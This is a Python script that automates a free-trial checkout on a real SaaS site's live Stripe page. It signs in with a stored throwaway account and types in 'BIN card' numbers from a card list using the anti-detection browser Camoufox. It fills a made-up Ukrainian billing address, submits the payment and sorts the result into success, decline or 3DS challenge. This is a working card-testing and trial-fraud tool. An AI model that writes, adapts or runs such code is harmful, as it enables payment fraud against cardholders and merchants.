# -*- coding: utf-8 -*-
"""Hit remalt Stripe checkout (starter, 7-day free trial) with BIN card via Camoufox.
Usage: python hit_stripe.py [card_index]  (default 0)
Flow: sign-in API -> POST /api/stripe/checkout {"item":"starter"} -> cs_live URL ->
      camoufox -> fill card -> submit -> watch result -> verify subscription API.
"""
import json, time, pathlib, sys, urllib.request, http.cookiejar

BASE = "https://remalt.com"
HERE = pathlib.Path(__file__).parent
SHOTS = HERE / "shots_stripe"
SHOTS.mkdir(exist_ok=True)

accs = [json.loads(l) for l in open(HERE / "accounts.jsonl", encoding="utf-8") if l.strip()]
cards = json.load(open(HERE / "cards.json", encoding="utf-8"))
ci = int(sys.argv[1]) if len(sys.argv) > 1 else 0
a = accs[-1]  # freshest account
card = cards[ci]
print("acc:", a["email"], "| card idx:", ci, "prefix:", card["number"][:6], "exp:", card["exp"])

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def api(path, data=None):
    body = json.dumps(data).encode() if data is not None else None
    h = {"User-Agent": "Mozilla/5.0", "Origin": BASE, "Accept": "application/json",
         "Content-Type": "application/json"}
    r = urllib.request.Request(BASE + path, data=body, headers=h,
                               method="POST" if data is not None else "GET")
    try:
        with opener.open(r, timeout=60) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

s, b = api("/api/auth/sign-in/email", {"email": a["email"], "password": a["password"]})
print("signin:", s)
cookies = {c.name: c.value for c in cj}

s, b = api("/api/stripe/checkout", {"item": "starter"})
print("checkout:", s)
url = json.loads(b)["url"]
print("url type:", "/c/pay" if "/c/pay" in url else ("/g/pay LINK-FIRST" if "/g/pay" in url else "?"), "len", len(url))

from camoufox.sync_api import Camoufox

with Camoufox(headless=False, geoip=False) as browser:
    page = browser.new_page()
    page.goto(url, timeout=90000, wait_until="domcontentloaded")
    time.sleep(6)
    print("title:", page.title())
    page.screenshot(path=str(SHOTS / "01_checkout.png"))
    txt = page.locator("body").inner_text().lower()
    if "link" in txt[:2000] and page.locator('input[name="cardNumber"]').count() == 0:
        # try switch to card form
        for sel in ['text="Card or bank account"', 'text="Use a card"', '[data-testid="payment-method-card"]']:
            try:
                page.locator(sel).first.click(timeout=4000)
                time.sleep(2)
            except Exception:
                pass

    inputs = page.evaluate("Array.from(document.querySelectorAll('input')).map(i=>i.name+'|'+(i.placeholder||'')+'|'+(i.autocomplete||''))")
    print("inputs:", inputs)

    def fill(sels, val):
        for sel in sels:
            try:
                loc = page.locator(sel).first
                if loc.count() > 0:
                    loc.focus(timeout=5000)
                    loc.press_sequentially(val, delay=55)
                    time.sleep(0.4)
                    print("filled", sel)
                    return True
            except Exception:
                continue
        print("MISS", sels)
        return False

    num = card["number"]
    exp = card["exp"]  # MMYY
    fill(['input[name="cardNumber"]', 'input[autocomplete="cc-number"]', 'input[name="cardnumber"]'], num)
    fill(['input[name="cardExpiry"]', 'input[autocomplete="cc-exp"]', 'input[placeholder*="MM"]'], exp[:2] + exp[2:])
    fill(['input[name="cardCvc"]', 'input[autocomplete="cc-csc"]', 'input[name="cvc"]'], card["cvv"])
    # billing address — Ukraine (BIN 515462 = UA); country auto-selected by Stripe
    fill(['input[name="billingName"]'], card["name"])
    fill(['input[name="billingAddressLine1"]'], "Khreshchatyk St 1")
    fill(['input[name="billingLocality"]'], "Kyiv")
    try:
        page.select_option('select[name="billingAdministrativeArea"]', index=1)
    except Exception:
        print("no state select")
    fill(['input[name="billingPostalCode"]'], "01001")
    # email prefill
    try:
        em = page.locator('input[name="email"], input[type="email"]').first
        if em.count() > 0 and not em.input_value():
            em.press_sequentially(a["email"], delay=30)
    except Exception:
        pass
    page.screenshot(path=str(SHOTS / "02_filled.png"))
    time.sleep(1)

    # capture network + console
    net_errs = []
    page.on("response", lambda r: net_errs.append((r.status, r.url[:120])) if r.status >= 400 else None)
    cons = []
    page.on("console", lambda m: cons.append(m.text[:200]) if m.type in ("error", "warning") else None)

    # submit
    try:
        btn = page.locator('button[type="submit"]').first
        btn.wait_for(state="visible", timeout=8000)
        for _ in range(20):
            if btn.is_enabled():
                break
            time.sleep(1)
        btn.click(timeout=8000, force=True)
        print("SUBMIT CLICKED")
    except Exception as e:
        page.evaluate('document.querySelectorAll(\'button[type="submit"]\').forEach(b=>b.click())')
        print("JS SUBMIT", e)

    # watch: 3DS/OTP or success
    result = "TIMEOUT"
    for i in range(40):
        time.sleep(3)
        try:
            body = page.locator("body").inner_text()
        except Exception:
            body = ""
        low = body.lower()
        if i % 4 == 0:
            page.screenshot(path=str(SHOTS / f"03_w{i:02d}.png"))
            print(f"[{i*3}s]", body[:200].replace("\n", " | "))
            if net_errs:
                print("  NET ERR:", net_errs[-3:])
                net_errs.clear()
            if cons:
                print("  CONSOLE:", cons[-3:])
                cons.clear()
        if "otp" in low or "one time" in low or "verification code" in low or "3d secure" in low or "authenticate" in low:
            result = "OTP_3DS"
            page.screenshot(path=str(SHOTS / "otp.png"))
            print(">>> 3DS/OTP SCREEN — нужен код с банка")
            break
        if "subscription" in low or "success" in low or "welcome" in low or "you're all set" in low or page.url.startswith(BASE):
            result = "SUCCESS?"
            print(">>> redirect/success:", page.url)
            break
        if "declined" in low or "could not be processed" in low or "invalid" in low or "failed" in low:
            result = "DECLINED"
            page.screenshot(path=str(SHOTS / "declined.png"))
            print(">>> DECLINED:", body[:400])
            break
    page.screenshot(path=str(SHOTS / "04_final.png"))
    print("RESULT:", result, "| final url:", page.url)
    json.dump({"result": result, "url": page.url, "acc": a["email"], "card_idx": ci},
              open(HERE / "stripe_hit_result.json", "w"))

# verify subscription state
time.sleep(5)
s, b = api("/api/stripe/subscription")
print("VERIFY subscription:", s)
print(b[:500])
